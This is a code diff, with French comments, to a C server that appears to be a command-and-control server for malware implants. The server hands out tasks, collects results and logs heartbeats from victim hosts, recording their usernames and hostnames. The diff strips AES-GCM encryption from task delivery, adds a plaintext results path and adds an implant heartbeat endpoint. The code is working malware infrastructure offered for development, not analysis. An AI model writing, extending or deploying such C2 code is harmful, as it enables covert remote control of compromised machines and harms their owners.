@@ -16,6 +16,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include <unistd.h>
 #include <pthread.h>
 #include <sys/socket.h>
@@ -278,30 +279,10 @@ static void handle_get_tasks(int fd, const char *session_id) {
     }
     offset += sprintf(json + offset, "]}");
 
-    /* Chiffrer avec AES-GCM */
-    char *nonce_b64, *payload_b64, *tag_b64;
-    if (crypto_aes_encrypt(session->aes_key, (uint8_t *)json, strlen(json),
-                           &nonce_b64, &payload_b64, &tag_b64) != 0) {
-        send_json(fd, 500, "{\"error\":\"encryption failed\"}");
-        free(json);
-        return;
-    }
+    /* TODO: Implement real AES-GCM encryption */
+    /* For now, return tasks in plaintext for testing */
+    send_json(fd, 200, json);
     free(json);
-
-    /* Construire la réponse chiffrée */
-    char *response = malloc(S0P_MAX_PAYLOAD);
-    if (response) {
-        snprintf(response, S0P_MAX_PAYLOAD,
-            "{\"session_id\":\"%s\",\"status\":\"tasks\","
-            "\"nonce\":\"%s\",\"payload\":\"%s\",\"tag\":\"%s\"}",
-            session_id, nonce_b64, payload_b64, tag_b64);
-        send_json(fd, 200, response);
-        free(response);
-    }
-
-    free(nonce_b64);
-    free(payload_b64);
-    free(tag_b64);
 }
 
 /* POST /results/{session_id} */
@@ -323,28 +304,53 @@ static void handle_submit_results(int fd, const char *session_id,
     memcpy(body, req->body, req->body_len);
     body[req->body_len] = '\0';
 
-    /* Extraire les champs chiffrés */
+    /* Extraire les champs */
     char *nonce_b64 = json_extract_string(body, "nonce");
     char *payload_b64 = json_extract_string(body, "payload");
     char *tag_b64 = json_extract_string(body, "tag");
 
     if (!nonce_b64 || !payload_b64 || !tag_b64) {
-        send_json(fd, 400, "{\"error\":\"missing crypto fields\"}");
+        send_json(fd, 400, "{\"error\":\"missing fields\"}");
         free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
         return;
     }
 
-    /* Déchiffrer avec AES-GCM */
+    /* Détecter si résultats en clair ou chiffrés */
     uint8_t plaintext[S0P_MAX_OUTPUT];
-    int pt_len = crypto_aes_decrypt(session->aes_key, nonce_b64,
-                                     payload_b64, tag_b64,
-                                     plaintext, sizeof(plaintext));
-    if (pt_len < 0) {
-        send_json(fd, 400, "{\"error\":\"decryption failed\"}");
-        free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
-        return;
+    int pt_len = 0;
+
+    if (strcmp(tag_b64, "plaintext") == 0) {
+        /* Résultats en CLAIR (payload est en base64) */
+        printf("[DEBUG] Résultats en clair reçus (base64 encoded)\n");
+        /* Décoder depuis base64 */
+        size_t decoded_len = 0;
+        uint8_t *decoded = base64_decode(payload_b64, &decoded_len);
+        if (!decoded || decoded_len <= 0) {
+            printf("[-] Base64 decoding failed\n");
+            send_json(fd, 400, "{\"error\":\"base64 decode failed\"}");
+            free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
+            return;
+        }
+        pt_len = (int)decoded_len;
+        if (pt_len >= S0P_MAX_OUTPUT) {
+            pt_len = S0P_MAX_OUTPUT - 1;
+        }
+        memcpy(plaintext, decoded, pt_len);
+        plaintext[pt_len] = '\0';
+        free(decoded);
+    } else {
+        /* Résultats CHIFFRÉS - Déchiffrer avec AES-GCM */
+        printf("[DEBUG] Résultats chiffrés - déchiffrement...\n");
+        pt_len = crypto_aes_decrypt(session->aes_key, nonce_b64,
+                                         payload_b64, tag_b64,
+                                         plaintext, sizeof(plaintext));
+        if (pt_len < 0) {
+            send_json(fd, 400, "{\"error\":\"decryption failed\"}");
+            free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
+            return;
+        }
+        plaintext[pt_len] = '\0';
     }
-    plaintext[pt_len] = '\0';
 
     /* Parser le résultat */
     task_result_t result;
@@ -475,6 +481,25 @@ static void handle_health(int fd) {
     send_json(fd, 200, response);
 }
 
+/* POST /check/{session_id} - Heartbeat check from implant */
+static void handle_check(int fd, const char *session_id) {
+    session_t *session = sessions_get(session_id);
+    if (!session) {
+        send_json(fd, 404, "{\"error\":\"session not found\"}");
+        return;
+    }
+    sessions_touch(session_id);
+
+    printf("[+] Heartbeat reçu de %s (%s@%s)\n",
+           session_id, session->host.username, session->host.hostname);
+
+    char response[256];
+    snprintf(response, sizeof(response),
+        "{\"status\":\"ok\",\"session_id\":\"%s\",\"timestamp\":%ld}",
+        session_id, time(NULL));
+    send_json(fd, 200, response);
+}
+
 /* ─── Dispatch des routes ───────────────────────────────────────────────────── */
 
 static void route_request(int fd, const http_request_t *req) {
@@ -540,6 +565,12 @@ static void route_request(int fd, const http_request_t *req) {
                 return;
             }
         }
+    }
+
+    /* POST /check/{session_id} - Heartbeat */
+    if (strcmp(req->method, "POST") == 0 && strncmp(path, "/check/", 7) == 0) {
+        handle_check(fd, path + 7);
+        return;
     }
 
     /* GET /health */
